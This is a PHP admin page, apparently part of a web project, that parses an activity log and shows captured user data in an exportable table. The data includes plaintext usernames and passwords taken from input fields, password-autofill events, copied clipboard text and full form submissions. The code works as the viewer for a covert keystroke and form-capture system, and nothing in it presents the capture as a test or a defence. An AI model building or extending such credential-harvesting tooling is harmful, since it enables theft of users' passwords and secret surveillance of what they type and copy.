<?php
// credentials_table.php
$title = "Sensitive Credentials Extracted from Activity Log";
require_once '../includes/auth.php';
require_once '../includes/config.php';
require_once '../includes/db.php';

// Only allow admins to view this sensitive information
requireAdmin(); // Replacing isAdmin() with requireAdmin()

// Function to parse the log file and extract sensitive information
function extractSensitiveData($logContent) {
    $entries = [];
    $lines = explode("\n", $logContent);
    
    foreach ($lines as $line) {
        if (strpos($line, 'input_change') !== false || 
            strpos($line, 'password_autofill') !== false || 
            strpos($line, 'login_attempt') !== false ||
            strpos($line, 'copy') !== false ||
            strpos($line, 'form_submit') !== false) {
            
            $jsonStart = strpos($line, '{');
            if ($jsonStart === false) continue;
            
            $jsonStr = substr($line, $jsonStart);
            $data = json_decode($jsonStr, true);
            if (!$data) continue;
            
            $entry = [
                'timestamp' => $data['timestamp'] ?? '',
                'action' => $data['action'] ?? '',
                'page' => $data['page'] ?? '',
                'ip_address' => $data['ip_address'] ?? ($data['userAgent'] ?? 'N/A'),
                'user_agent' => $data['userAgent'] ?? 'N/A',
                'username' => '',
                'password' => '',
                'copied_text' => '',
                'autofill_field' => '',
                'form_data' => '',
                'target_element' => '',
                'status' => 'Captured'
            ];
            
            // Extract different types of sensitive data with more details
            if ($data['action'] === 'input_change') {
                $entry['target_element'] = ($data['tag'] ?? '') . 
                                          (isset($data['id']) ? '#'.$data['id'] : '') . 
                                          (isset($data['class']) ? '.'.$data['class'] : '');
                if (isset($data['name'])) {
                    if ($data['name'] === 'username') {
                        $entry['username'] = $data['newValue'] ?? '';
                        $entry['type'] = 'Username Input';
                    }
                    elseif ($data['name'] === 'password') {
                        $entry['password'] = $data['newValue'] ?? '';
                        $entry['type'] = 'Password Input';
                    }
                }
            }
            elseif ($data['action'] === 'password_autofill') {
                $entry['autofill_field'] = $data['fieldName'] ?? '';
                $entry['type'] = 'Password Autofill';
                $entry['target_element'] = 'input[name="'.$entry['autofill_field'].'"]';
            }
            elseif ($data['action'] === 'login_attempt') {
                $entry['username'] = $data['username'] ?? '';
                $entry['type'] = 'Login Attempt';
                $entry['status'] = 'Attempted';
            }
            elseif ($data['action'] === 'copy') {
                $entry['copied_text'] = $data['text'] ?? '';
                $entry['type'] = 'Copied Text';
                $entry['target_element'] = ($data['targetTag'] ?? '') . 
                                          (isset($data['targetId']) ? '#'.$data['targetId'] : '') . 
                                          (isset($data['targetClass']) ? '.'.$data['targetClass'] : '');
            }
            elseif ($data['action'] === 'form_submit') {
                $entry['type'] = 'Form Submission';
                $entry['form_data'] = $data['formData'] ?? '';
                $entry['status'] = 'Submitted';
                if (isset($data['formMethod'])) {
                    $entry['action'] .= ' ('.strtoupper($data['formMethod']).')';
                }
            }
            
            // Add to entries if we found something sensitive
            if (!empty($entry['type'])) {
                $entries[] = $entry;
            }
        }
    }
    
    return $entries;
}

// Read the log file
$logContent = file_get_contents('../logs/logs.log');
$sensitiveData = extractSensitiveData($logContent);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($title); ?></title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.min.css">
    <style>
        .security-dashboard {
            width: 100%;
            margin: 20px 0;
            font-size: 0.9em;
        }
        .security-dashboard thead tr {
            background-color: #215967;
            color: #ffffff;
        }
        .security-dashboard th,
        .security-dashboard td {
            padding: 8px 12px;
            vertical-align: top;
        }
        .security-dashboard tbody tr {
            border-bottom: 1px solid #dddddd;
        }
        .security-dashboard tbody tr:nth-of-type(even) {
            background-color: #f3f3f3;
        }
        .security-dashboard tbody tr:hover {
            background-color: #e2efda;
        }
        .credential {
            font-family: monospace;
        }
        .sensitive {
            background-color: #ffebee;
            font-weight: bold;
        }
        .username {
            color: #2980b9;
        }
        .password {
            color: #e74c3c;
        }
        .copied-text {
            color: #9b59b6;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        h1 {
            color: #215967;
            margin-bottom: 20px;
        }
        .container {
            padding: 20px;
            max-width: 100%;
            margin: 0 auto;
            overflow-x: auto;
        }
        .status-attempted {
            color: #f39c12;
        }
        .status-submitted {
            color: #27ae60;
        }
        .status-captured {
            color: #3498db;
        }
        .badge {
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 0.8em;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><?php echo htmlspecialchars($title); ?></h1>
        
        <table id="credentialsTable" class="security-dashboard display nowrap" style="width:100%">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Action Type</th>
                    <th>Details</th>
                    <th>Page</th>
                    <th>IP/Device</th>
                    <th>User Agent</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Copied Text</th>
                    <th>Form Data</th>
                    <th>Target Element</th>
                    <th>Status</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($sensitiveData as $entry): ?>
                <tr>
                    <td><?php echo htmlspecialchars(substr($entry['timestamp'], 0, 19)); ?></td>
                    <td><?php echo htmlspecialchars($entry['type']); ?></td>
                    <td><?php echo htmlspecialchars($entry['action']); ?></td>
                    <td><?php echo htmlspecialchars(basename($entry['page'])); ?></td>
                    <td><?php echo htmlspecialchars($entry['ip_address']); ?></td>
                    <td><?php echo htmlspecialchars(substr($entry['user_agent'], 0, 30) . (strlen($entry['user_agent']) > 30 ? '...' : '')); ?></td>
                    <td class="username"><?php echo htmlspecialchars($entry['username']); ?></td>
                    <td class="password sensitive"><?php echo htmlspecialchars($entry['password']); ?></td>
                    <td class="copied-text" title="<?php echo htmlspecialchars($entry['copied_text']); ?>">
                        <?php echo htmlspecialchars(substr($entry['copied_text'], 0, 30) . (strlen($entry['copied_text']) > 30 ? '...' : '')); ?>
                    </td>
                    <td>
                        <?php if (!empty($entry['form_data'])): ?>
                            <button class="view-form-data" data-data="<?php echo htmlspecialchars($entry['form_data']); ?>">View</button>
                        <?php endif; ?>
                    </td>
                    <td><?php echo htmlspecialchars($entry['target_element']); ?></td>
                    <td>
                        <span class="badge status-<?php echo strtolower(str_replace(' ', '-', $entry['status'])); ?>">
                            <?php echo htmlspecialchars($entry['status']); ?>
                        </span>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <!-- Modal for viewing form data -->
    <div id="formDataModal" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; padding:20px; border:1px solid #ccc; z-index:1000; max-width:80%; max-height:80%; overflow:auto;">
        <pre id="formDataContent"></pre>
        <button onclick="document.getElementById('formDataModal').style.display='none'">Close</button>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
    <script>
        $(document).ready(function() {
            $('#credentialsTable').DataTable({
                responsive: true,
                scrollX: true,
                order: [[0, 'desc']],
                pageLength: 25,
                dom: 'Bfrtip',
                buttons: [
                    'copy', 'csv', 'excel', 'pdf', 'print'
                ]
            });

            // Handle form data viewing
            $('.view-form-data').click(function() {
                const formData = $(this).data('data');
                $('#formDataContent').text(JSON.stringify(JSON.parse(formData), null, 2));
                $('#formDataModal').show();
            });
        });
    </script>
</body>
</html>